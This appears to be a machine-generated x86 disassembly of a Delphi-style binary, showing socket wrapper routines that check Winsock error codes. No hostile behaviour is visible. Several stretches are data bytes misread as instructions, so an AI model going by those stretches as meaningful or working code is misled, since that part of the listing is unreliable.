add al 0x50
outsd
jb r-xdata
lahf
inc ebp
add [ eax + eax ] cl
add [ eax ] al
dec esp
lahf
inc ebp
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
inc eax
add ah bh
lahf
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
inc ecx
add [ eax + eax ] al
push cs
dec ecx
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
cmp [ esi + 0x17240045 ] bl
add bh bh
add [ eax ] eax
adc [ eax ] al
adc al 0x0
add bh bh
adc al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
add cl [ ecx + 0x50 ]
cmp al 0x10
inc eax
add [ eax + eax ] bl
add bh bh
sbb al 0x0
call sub_456954
mov [ ebx + 0xc ] eax
mov [ ebx + 0x10 ] 0x1
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx edi
mov edx esi
mov dl 0x1
mov eax ebx
call sub_45a648
sub_45a0dc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebx + 0x10 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx edi
mov edx esi
call sub_456954
mov [ ebx + 0xc ] eax
mov [ ebx + 0x10 ] 0x1
pop edi
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_45a648
sub_45a14c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx edx
mov edx [ ebx + 0xc ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_45a600
mov eax ebx
call sub_45a624
sub_45a184
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4141ec
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_45a1b4
push ebp
mov ebp esp
push ebx
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov eax [ eax + 0xc ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0x48 ]
pop ebx
pop ebp
retn 0x4
sub_45a1d8
push ebp
mov ebp esp
push ebx
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov eax [ eax + 0xc ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0x54 ]
pop ebx
pop ebp
retn 0x4
sub_45a1fc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx esi
mov edx [ ebx + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x5c ]
mov edx eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_456900
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_45a23c
push ebp
mov ebp esp
push ebx
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov eax [ eax + 0xc ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0x4c ]
pop ebx
pop ebp
retn 0xc
sub_45a268
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x14 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_45a37c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov eax ebx
call sub_45a678
test al al
jne r-xdata
cmp [ ebx + 0x24 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a383
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403ed0
retn
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
cmp [ ebx + 0x28 ] 0x0
je r-xdata
mov eax [ ebx + 0x24 ]
cmp eax [ ebx + 0x28 ]
jle r-xdata
mov eax ebx
call sub_45a6cc
test al al
jne r-xdata
mov eax [ ebx + 0x24 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
mov eax [ ebx + 0x28 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1fc
call sub_403864
jmp r-xdata
mov eax [ ebx + 0x24 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
mov eax [ ebx + 0x28 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1fc
call sub_403864
jmp r-xdata
sub_45a388
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebx + 0x18 ]
mov edx esi
call sub_403f00
mov [ ebx + 0x20 ] edi
pop edi
pop esi
pop ebx
retn
sub_45a3a4
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov edi eax
mov dl 0x1
mov eax edi
call sub_45a648
lea eax [ edi + 0x1c ]
push eax
lea ecx [ edi + 0x14 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov esi eax
push 0x1
mov [ esp + 0x4 ] 0x2714
mov [ esp + 0x8 ] 0x2736
lea ecx [ esp + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_45690c
mov ebx eax
xor bl 0x1
test bl bl
je r-xdata
mov eax ebx
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov [ edi + 0xc ] esi
mov [ edi + 0x10 ] 0x1
mov eax edi
call sub_45a600
mov eax edi
call sub_45a624
sub_45a418
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx esi
xor edx edx
mov eax edi
call sub_4141b4
mov dl 0x1
mov eax edi
call sub_45a648
xor eax eax
mov [ edi + 0x24 ] eax
xor eax eax
mov [ edi + 0x28 ] eax
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax edi
test bl bl
je r-xdata
mov eax [ esi + 0x1c ]
mov [ edi + 0x1c ] eax
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_45a470
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45a5a1
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov eax [ r-xdata ]
call sub_458b98
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45a584
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x8 ]
call sub_413704
push 0x0
push esi
mov eax [ rw-data ]
mov eax [ eax ]
xor ecx ecx
mov edx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x50 ]
dec eax
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
sete dl
xor ecx ecx
mov eax [ r-xdata ]
call sub_458b54
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4030f0
retn
cmp esi 0xfffffffe
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x34 ]
cmp esi eax
jle r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x34 ]
mov eax ebx
call sub_45a470
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx esi
sub edx eax
mov eax ebx
call sub_45a470
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a5a8
lea eax [ ebp - 0xc ]
call sub_403eac
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov esi [ eax + 0x34 ]
sub_45a5b4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_403038
mov edi eax
mov eax esi
call sub_403038
cmp edi eax
je r-xdata
lea eax [ ebx + 0x14 ]
mov edx [ esi + 0x14 ]
call sub_403f00
mov eax [ esi + 0x1c ]
mov [ ebx + 0x1c ] eax
lea eax [ ebx + 0x18 ]
mov edx [ esi + 0x18 ]
call sub_403f00
mov eax [ esi + 0x20 ]
mov [ ebx + 0x20 ] eax
mov edx esi
mov eax ebx
call sub_413e5c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45a600
push ebx
push ecx
lea edx [ eax + 0x14 ]
push edx
lea edx [ eax + 0x1c ]
push edx
lea ecx [ esp + 0x8 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0xc ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x74 ]
pop edx
pop ebx
retn
sub_45a624
push ebx
push ecx
lea edx [ eax + 0x18 ]
push edx
lea edx [ eax + 0x20 ]
push edx
lea ecx [ esp + 0x8 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0xc ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x70 ]
pop edx
pop ebx
retn
sub_45a648
push ebx
mov ebx eax
mov [ ebx + 0x10 ] 0x0
mov [ ebx + 0xc ] 0xffffffff
test dl dl
je r-xdata
lea eax [ ebx + 0x18 ]
call sub_403eac
xor eax eax
mov [ ebx + 0x20 ] eax
pop ebx
retn
lea eax [ ebx + 0x14 ]
call sub_403eac
xor eax eax
mov [ ebx + 0x1c ] eax
sub_45a678
push ebx
push esi
push ecx
mov esi eax
push 0x0
mov eax [ esi + 0x14 ]
push eax
mov eax [ esi + 0x1c ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx 0x2
mov edx [ esi + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov edx eax
mov [ esp + 0x4 ] 0x2740
lea ecx [ esp + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45690c
mov ebx eax
xor bl 0x1
test bl bl
je r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_45a600
sub_45a6cc
push ebx
push esi
push edi
push ebp
mov ebp eax
xor ebx ebx
mov edi [ ebp + 0x28 ]
mov esi [ ebp + 0x24 ]
sub esi edi
jg r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
dec esi
dec edi
inc esi
jne r-xdata
mov bl 0x1
jmp r-xdata
mov [ ebp + 0x1c ] edi
mov eax ebp
call sub_45a678
test al al
je r-xdata
sub_45a6fc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45a721
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a728
retn
sub_45a734
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45a759
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a760
retn
sub_45a76c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45a791
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a798
retn
sub_45a7a4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45a7c9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a7d0
retn
sub_45a7dc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45a801
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a808
retn
sub_45a814
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45a839
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a840
retn
sub_45a84c
cwde
test al 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp * 4 ] cl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
test al 0x45
add [ eax + eax ] dh
add [ eax ] bh
xchg ecx eax
inc ebp
add [ edx + 0x41 ] bh
add [ ebx + esi ] ch
inc eax
add al dl
fwait
inc ecx
add [ ebx + esi ] dh
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi - 0x506fffc0 ] ah
inc ebp
add [ eax + 0x3f ] al
add [ ebx ] 0x0
or [ ebx + 0x6f ] edx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
inc ecx
add [ esi + ebx * 4 + 0x3e5c0041 ] al
inc ecx
add [ edi + ebx * 4 + 0x41 ] bl
add ah dl
scasd [ edi ]
inc ebp
add [ edi + ebx * 4 + 0x41 ] ch
add [ eax + 0x41 ] ah
add [ edx - 0x6083ffbf ] dl
inc eax
aas
or al 0xa9
inc ebp
add [ edi ] al
adc dl [ ecx + ecx * 2 + 0x64 ]
dec ecx
dec edi
dec eax
popad
outsb
insb
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add al 0x0
or [ ebp + 0x73 ] dl
dec esi
popad
insb
lea eax [ eax ]
aam 0xa9
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x40 ] eax
mov eax [ ebp - 0x4 ]
call sub_419a38
mov eax [ r-xdata ]
call sub_458b98
test al al
je r-xdata
popad
nop
inc ecx
add [ edi + ebx * 4 + 0x41 ] dh
add [ edx - 0x5277ffbf ] bl
inc ebp
add [ edi + ecx * 4 - 0x701bffbb ] ch
inc ebp
add [ eax + edx * 4 ] dl
inc ebp
add [ edx + edx * 4 + 0x45 ] dl
add [ eax ] al
stosb [ edi ]
inc ebp
add [ eax + 0x740045ab ] dl
lodsd [ esi ]
inc ebp
add ah al
lodsd [ esi ]
inc ebp
add ah dh
lodsd [ esi ]
inc ebp
add [ eax ] al
scasb [ edi ]
inc ebp
add [ eax + 0x120045ae ] al
push esp
dec ecx
dec ecx
dec edi
dec eax
popad
outsb
insb
jb r-xdata
lahf
test al 0x45
add al dh
xchg ecx eax
inc ebp
add [ 0x64491100 ] al
dec ecx
dec edi
dec eax
popad
outsb
insb
jb r-xdata
mov edi 0x7d
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x34 ]
mov edx 0x7d
call sub_458320
mov edi eax
jmp r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
test eax 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
out dx al
test eax r--data
add [ eax ] al
fcomp [ edi ]
inc ecx
add [ eax ] ah
xor eax [ eax ]
or [ eax + 0x33300041 ] bl
inc eax
add [ ebx + esi ] dh
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi - 0x685fffc0 ] ah
inc ecx
add [ eax + ebx * 4 - 0x5003ffbf ] bh
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + r-xdata ] dl
add [ eax ] al
adc [ ecx + ecx * 2 + 0x64 ] dl
inc ebx
outsd
outsb
outsb
arpl [ gs : esp + edx * 2 + 0x68 ] si
jb r-xdata
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
cmp edi esi
jge r-xdata
lea esi [ edi + 0x1 ]
test bl bl
je r-xdata
arpl [ ebx + 0x73 ] bp
dec ecx
outsb
outsw
add [ eax ] dl
inc eax
add [ eax + eax ] ch
[ eax + eax ]
xchg ebx eax
inc ebp
add [ eax - 0x51 ] ch
inc ebp
add [ eax ] al
scasd [ edi ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53090003 ] al
outsd
add ah dh
mov eax esi
call sub_458610
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax edi
call sub_458610
sub esi edi
test bl bl
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_419a60
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebp - 0x4 ]
call sub_419a68
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_40416c
test eax eax
jle r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_458b54
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
lea esi [ edi + 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ab6c
mov eax [ ebp - 0x4 ]
call sub_4030f0
retn
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
jmp r-xdata
cmp edi esi
jl r-xdata
xor esi esi
jmp r-xdata
sub_45aa1c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov esi eax
xor eax eax
push ebp
push sub_45ab82
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi 0xfffffffe
sete bl
mov cl 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_4196d0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45ab65
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x40 ] eax
mov eax [ ebp - 0x4 ]
call sub_419a38
mov eax [ r-xdata ]
call sub_458b98
test al al
je r-xdata
mov edi 0x7d
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x34 ]
mov edx 0x7d
call sub_458320
mov edi eax
jmp r-xdata
cmp edi esi
jge r-xdata
lea esi [ edi + 0x1 ]
test bl bl
je r-xdata
mov eax esi
call sub_458610
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax edi
call sub_458610
sub esi edi
test bl bl
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_419a60
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebp - 0x4 ]
call sub_419a68
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_40416c
test eax eax
jle r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_458b54
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
lea esi [ edi + 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ab6c
mov eax [ ebp - 0x4 ]
call sub_4030f0
retn
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
jmp r-xdata
cmp edi esi
jl r-xdata
xor esi esi
jmp r-xdata
sub_45ab90
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_45ad61
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_45af68
mov al [ eax + 0x7c ]
dec eax
sub al 0x3
jae r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_403f44
mov edi [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45af68
mov edx [ eax + 0x6c ]
lea eax [ ebp - 0x10 ]
call sub_403f44
mov eax [ ebp - 0x4 ]
call sub_45af68
mov edi [ eax + 0x74 ]
jmp r-xdata
lea ecx [ ebp - 0x1c ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x10 ]
call sub_456a4c
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov ecx edi
call sub_45a388
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
jne r-xdata
push 0x0
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_458ef0
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push esi
mov ecx edi
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_459220
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x68 ]
xor ecx ecx
mov edx 0x1
mov eax ebx
call sub_45a0dc
lea eax [ ebx + 0x14 ]
mov edx [ ebp + 0x18 ]
call sub_403f00
mov eax [ ebp + 0x14 ]
mov [ ebx + 0x1c ] eax
mov eax [ ebp + 0x10 ]
mov [ ebx + 0x24 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x28 ] eax
mov eax ebx
call sub_45a268
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x10 ]
call sub_456ef8
test al al
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_458ef0
cmp esi 0xffffffff
je r-xdata
mov eax [ rw-data ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov ecx 0x1
mov edx 0x6
call sub_45a1fc
mov eax [ r-xdata ]
call sub_458b98
test al al
je r-xdata
test esi esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov edx eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_456900
jmp r-xdata
push ebp
mov eax 0x1d4c0
call sub_45aa1c
pop ecx
jmp r-xdata
push ebp
mov eax esi
call sub_45aa1c
pop ecx
mov eax [ ebp - 0x4 ]
call sub_45af68
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_459d98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ad68
lea eax [ ebp - 0x1c ]
call sub_403eac
lea eax [ ebp - 0x10 ]
call sub_403eac
retn
sub_45ad88
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_458dd8
mov [ esi + 0x6c ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax esi
pop esi
pop ebx
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_45adc4
push ebx
mov ebx eax
mov eax ebx
call sub_459258
mov eax [ ebx + 0x68 ]
test eax eax
jne r-xdata
mov dl 0x1
call sub_45a648
pop ebx
retn
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45a418
mov [ ebx + 0x68 ] eax
pop ebx
retn
sub_45ae00
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45ae70
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x48 ]
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
push 0x0
mov edx esi
mov ecx edi
mov eax [ ebx + 0x68 ]
call sub_45a1b4
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ae77
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
sub_45ae80
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45aef0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x48 ]
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
push 0x0
mov edx esi
mov ecx edi
mov eax [ ebx + 0x68 ]
call sub_45a1d8
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45aef7
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
sub_45af00
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov [ ebx + 0x70 ] esi
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ ebx + 0x70 ]
test eax eax
je r-xdata
mov eax ebx
call sub_45af68
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax esi
mov [ ebx + 0x70 ] eax
mov edx ebx
call sub_419bdc
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax ebx
call sub_45af68
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
xor eax eax
mov [ ebx + 0x70 ] eax
lea eax [ ebx + 0x70 ]
call sub_40cb14
mov eax [ ebx + 0x70 ]
mov [ eax + 0x80 ] ebx
pop esi
pop ebx
retn
sub_45af68
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebx + 0x70 ]
pop ebx
retn
cmp [ ebx + 0x70 ] 0x0
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_459548
mov [ ebx + 0x70 ] eax
sub_45af90
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
mov eax [ esi + 0x70 ]
test eax eax
je r-xdata
lea eax [ esi + 0x68 ]
call sub_40cb14
mov edx ebx
and dl 0xfc
mov eax esi
call sub_459228
test bl bl
jle r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
lea eax [ esi + 0x70 ]
call sub_40cb14
sub_45afd4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_419e28
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
